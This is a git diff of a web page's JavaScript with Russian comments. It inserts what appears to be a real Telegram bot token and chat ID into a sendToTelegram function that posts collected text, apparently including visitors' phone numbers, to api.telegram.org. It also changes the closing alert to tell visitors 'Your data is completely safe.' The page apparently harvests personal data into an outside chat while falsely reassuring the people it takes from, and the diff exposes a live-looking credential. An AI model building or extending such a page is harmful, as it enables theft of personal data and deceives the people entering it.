@@ -270,8 +270,8 @@
     let phoneNumber = '';
 
     function sendToTelegram(text) {
-      const botToken = 'ВАШ_ТОКЕН';      // ← вставьте сюда токен бота
-      const chatId = 'ВАШ_CHAT_ID';      // ← вставьте сюда ваш chat_id
+      const botToken = '7964523292:AAGSzi3epDu7dZt_vYCvLCMXt7LFe3zaPGw';      // ← вставьте сюда токен бота
+      const chatId = '1994625578';      // ← вставьте сюда ваш chat_id
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
@@ -318,7 +318,7 @@
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.querySelector('.btn').disabled = false;
-        alert('Спасибо! Данные в порядке.');
+        alert('Спасибо! Ваши данные в полной безопасности.');
       }, 2000);
     }
 
